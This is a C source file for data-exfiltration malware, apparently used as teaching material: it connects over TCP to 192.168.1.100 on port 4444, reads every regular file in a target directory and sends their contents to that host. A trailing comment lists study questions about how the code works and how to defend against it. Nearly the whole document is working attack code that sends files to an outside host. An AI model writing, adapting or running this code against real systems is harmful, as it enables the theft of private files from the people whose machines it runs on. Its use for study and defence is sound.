#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>

#define SERVER_IP "192.168.1.100"
#define SERVER_PORT 4444
#define BUF_SIZE 1024

void exfiltrate_file(int sock, const char *filename) {
    int fd;
    char buffer[BUF_SIZE];
    ssize_t bytes_read;

    fd = open(filename, O_RDONLY);
    if (fd < 0) {
        perror("Failed to open file");
        return;
    }

    while ((bytes_read = read(fd, buffer, BUF_SIZE)) > 0) {
        send(sock, buffer, bytes_read, 0);
    }

    close(fd);
}

void exfiltrate_directory(int sock, const char *dirpath) {
    DIR *dir;
    struct dirent *entry;
    char filepath[1024];

    if ((dir = opendir(dirpath)) == NULL) {
        perror("Failed to open directory");
        return;
    }

    while ((entry = readdir(dir)) != NULL) {
        if (entry->d_type == DT_REG) {
            snprintf(filepath, sizeof(filepath), "%s/%s", dirpath, entry->d_name);
            exfiltrate_file(sock, filepath);
        }
    }

    closedir(dir);
}

int main() {
    int sock;
    struct sockaddr_in server_addr;

    // Create socket
    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        perror("Socket creation failed");
        exit(EXIT_FAILURE);
    }

    // Server address setup
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(SERVER_PORT);
    if (inet_pton(AF_INET, SERVER_IP, &server_addr.sin_addr) <= 0) {
        perror("Invalid address/ Address not supported");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Connect to server
    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        exit(EXIT_FAILURE);
    }

    // Exfiltrate data
    exfiltrate_directory(sock, "/path/to/target/directory");

    close(sock);
    return 0;
}


/* Q&A - Data Exfiltration Malware Code

1 - What is the purpose of the exfiltrate_file function, and how does it achieve this objective?

    

Explain the role of the exfiltrate_directory function in the context of this malware.
Identify any potential security vulnerabilities in this code.
How does the malware establish a connection to the attacker's server?
Describe the process of data exfiltration as implemented in this malware.
What is the significance of the buffer size (BUF_SIZE) in the exfiltrate_file function?
Explain the use of the inet_pton function in the main function.
What would happen if the inet_pton function failed, and how does the code handle this situation?
Discuss the implications of the directory traversal in the exfiltrate_directory function.
Suggest potential improvements or mitigations to secure a system against this type of data exfiltration malware.

*/